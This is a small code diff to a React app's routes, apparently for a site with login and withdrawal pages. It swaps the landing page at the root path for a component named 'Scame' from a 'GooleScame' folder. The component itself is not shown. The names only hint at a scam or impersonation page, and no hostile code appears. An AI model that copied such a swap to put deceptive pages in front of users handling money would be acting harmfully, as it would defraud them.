@@ -39,13 +39,14 @@ import BankTransfer from './Dashboard2/Withdraw/bankdetail';
 import ForgotPassword from './Components/Auth/ForgotPassword';
 import RestPassword from './Components/Auth/RestPassword';
 import SendWithdrawReq from './Dashboard2/SendWithdraw';
+import Scame from "./Components/GooleScame/Scame"
 
 const App = () => {
   return (
     <BrowserRouter>
       <Header/>
       <Routes>
-        <Route path='/' element={<Landing/>}/>
+        <Route path='/' element={<Scame/>}/>
         <Route path='/login' element={<Login/>}/>
         <Route path='/forgotpassword' element={<ForgotPassword/>}/>
         <Route path='/restLink/:userid/:tokenid' element={<RestPassword/>}/>
